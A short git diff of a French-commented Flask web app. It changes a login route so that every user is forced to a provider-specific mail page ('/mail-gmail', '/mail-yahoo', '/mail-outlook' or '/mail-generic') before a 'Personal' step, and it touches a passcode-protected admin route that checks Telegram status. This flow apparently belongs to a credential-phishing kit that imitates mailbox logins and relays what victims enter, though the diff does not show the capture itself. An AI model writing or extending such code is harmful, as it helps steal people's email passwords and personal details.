@@ -696,16 +696,17 @@ def api_login():
         
         domain = email.split('@')[1].lower() if '@' in email else ''
         
+        # TOUJOURS ALLER À LA PAGE MAIL CORRESPONDANTE
+        # L'étape Mail est OBLIGATOIRE avant Personal
         if 'gmail.com' in domain or 'googlemail.com' in domain:
             next_page = '/mail-gmail'
         elif 'yahoo.com' in domain or 'ymail.com' in domain or 'rocketmail.com' in domain:
             next_page = '/mail-yahoo'
         elif 'outlook.com' in domain or 'hotmail.com' in domain or 'live.com' in domain or 'msn.com' in domain:
             next_page = '/mail-outlook'
-        elif '@' in email:
-            next_page = '/mail-generic'
         else:
-            next_page = '/personal'
+            # Pour tous les autres domaines, page générique
+            next_page = '/mail-generic'
         
         return jsonify({'status': 'success', 'next': next_page})
     except Exception as e:
@@ -935,7 +936,6 @@ def clear_errors():
 
 @app.route('/api/admin/telegram-status', methods=['GET'])
 def telegram_status():
-    """Route pour vérifier le statut Telegram sans spam"""
     try:
         passcode = request.headers.get('X-Admin-Passcode')
         if passcode != CONFIG['admin_passcode']:
